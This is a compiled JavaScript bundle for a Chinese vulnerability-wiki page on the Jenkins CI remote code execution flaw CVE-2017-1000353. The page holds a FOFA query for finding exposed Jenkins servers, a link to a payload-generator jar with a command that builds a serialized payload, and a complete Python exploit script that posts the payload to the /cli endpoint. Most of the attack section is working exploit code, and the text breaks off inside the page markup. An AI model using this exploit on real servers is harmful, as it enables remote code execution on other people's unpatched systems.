(window.webpackJsonp=window.webpackJsonp||[]).push([[101],{2089:function(s,t,a){s.exports=a.p+"assets/img/1629513094370-fcc9d9e0-e71c-4e95-a197-b24f0bb85f2f-20220308154434574.d5ded5f9.png"},2090:function(s,t,a){s.exports=a.p+"assets/img/1629514273598-a151eaba-8a4e-4070-b274-caaedef61293.11d78f3a.png"},2091:function(s,t,a){s.exports=a.p+"assets/img/1629514591067-fd7562de-73c4-4600-b071-459df7843238.24c3265e.png"},2092:function(s,t,a){s.exports=a.p+"assets/img/1629514953277-01a113d9-3d07-4656-921b-0e80bcd712b9.d7b9ea2d.png"},2550:function(s,t,a){"use strict";a.r(t);var n=a(75),e=Object(n.a)({},(function(){var s=this,t=s.$createElement,n=s._self._c||t;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"jenkins-ci-远程代码执行漏洞-cve-2017-1000353"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#jenkins-ci-远程代码执行漏洞-cve-2017-1000353"}},[s._v("#")]),s._v(" Jenkins CI 远程代码执行漏洞 CVE-2017-1000353")]),s._v(" "),n("h2",{attrs:{id:"漏洞描述"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),n("p",[s._v("攻击者可以将序列化的Java SignedObject对象，传输到基于远程处理的Jenkins CLI，这将最终造成反序列化，进而绕过现有基于黑名单的保护机制。Altoros Jenkins for PCF 1.0.2之前所有版本都受影响，所有用户尽快升级")]),s._v(" "),n("h2",{attrs:{id:"漏洞影响"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[s._v("Jenkins")]),n("br"),s._v(" "),n("h2",{attrs:{id:"网络测绘"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),n("a-checkbox",{attrs:{checked:""}},[n("a-button",{attrs:{href:"https://fofa.info/result?qbase64=YXBwPSJKZW5raW5zIg%3D%3D"}},[s._v('app="Jenkins"')])],1),s._v(" "),n("h2",{attrs:{id:"漏洞复现"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),n("p",[s._v("登录页面")]),s._v(" "),n("p",[n("img",{attrs:{src:a(2089),alt:"img"}})]),s._v(" "),n("a-alert",{attrs:{type:"success",message:"下载生成POC的工具: https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar",description:"",showIcon:""}}),s._v(" "),n("br"),s._v(" "),n("p",[s._v("生成 "),n("code",[s._v("jenkins_poc.ser")])]),s._v(" "),n("div",{staticClass:"language-bash line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-bash"}},[n("code",[s._v("java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"touch /tmp/success"')]),s._v("\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:a(2090),alt:"img"}})]),s._v(" "),n("p",[s._v("使用Python脚本命令执行")]),s._v(" "),n("p",[n("code",[s._v("https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py")])]),s._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[s._v("python3 jenkins"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("py http"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("//")]),s._v("xxx"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("xxx"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("xxx"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("xxx"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("8080")]),s._v(" jenkins_poc"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("ser\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br")])]),n("p",[n("img",{attrs:{src:a(2091),alt:"img"}})]),s._v(" "),n("p",[s._v("成功生成 success")]),s._v(" "),n("p",[n("img",{attrs:{src:a(2092),alt:"img"}})]),s._v(" "),n("h2",{attrs:{id:"漏洞poc"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#漏洞poc"}},[s._v("#")]),s._v(" 漏洞POC")]),s._v(" "),n("div",{staticClass:"language-python line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-python"}},[n("code",[n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" urllib\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" sys\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" requests\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" uuid\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" threading\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" time\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" gzip\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" urllib3\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" zlib\n\nproxies "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 'http': 'http://127.0.0.1:8085',")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 'https': 'http://127.0.0.1:8090',")]),s._v("\n"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\nURL "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'%s/cli'")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),s._v(" sys"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("argv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("rstrip"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nPREAMLE "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'<===[JENKINS REMOTING CAPACITY]===>rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4='")]),s._v("\nPROTO "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'\\x00\\x00\\x00\\x00'")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("with")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("open")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("sys"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("argv"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"rb"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("as")]),s._v(" f"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    FILE_SER "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" f"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("read"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("download")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" session"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n\n    headers "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Side'")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'download'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Content-type'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'application/x-www-form-urlencoded'")]),s._v("\n    headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Session'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" session\n    headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Transfer-Encoding'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'chunked'")]),s._v("\n    r "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("post"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" data"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("null_payload"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" proxies"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("proxies"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" stream"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("True")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" verify"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("False")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("r"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("content"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("upload")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" session"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" data"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n\n    headers "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Side'")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'upload'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Session'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" session\n    headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Content-type'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'application/octet-stream'")]),s._v("\n    headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Accept-Encoding'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("None")]),s._v("\n    r "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("post"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("data"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("data"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("proxies"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("proxies"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" verify"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("False")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("upload_chunked")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("session"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" data"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n\n    headers "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Side'")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'upload'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Session'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" session\n    headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Content-type'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'application/octet-stream'")]),s._v("\n    headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Accept-Encoding'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("None")]),s._v("\n    headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Transfer-Encoding'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'chunked'")]),s._v("\n    headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Cache-Control'")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v("'no-cache'")]),s._v("\n\n    r "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" requests"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("post"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("url"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" headers"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("headers"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" data"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("create_payload_chunked"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" proxies"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("proxies"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" verify"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token boolean"}},[s._v("False")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("null_payload")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("yield")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('b" "')]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("create_payload")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    payload "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" PREAMLE "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" PROTO "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" FILE_SER\n\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" payload\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("create_payload_chunked")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("yield")]),s._v(" PREAMLE\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("yield")]),s._v(" PROTO\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("yield")]),s._v(" FILE_SER\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("def")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token function"}},[s._v("main")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"start"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n    session "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("str")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("uuid"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("uuid4"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n    t "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" threading"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("Thread"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("target"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("download"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" args"),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("URL"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" session"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    t"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("start"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    \n    time"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sleep"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token number"}},[s._v("2")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"pwn"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),n("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#upload(URL, session, create_payload())")]),s._v("\n\n    upload_chunked"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("URL"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" session"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"asdf"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),n("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" __name__ "),n("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),n("span",{pre:!0,attrs:{class:"token string"}},[s._v('"__main__"')]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    main"),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),n("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n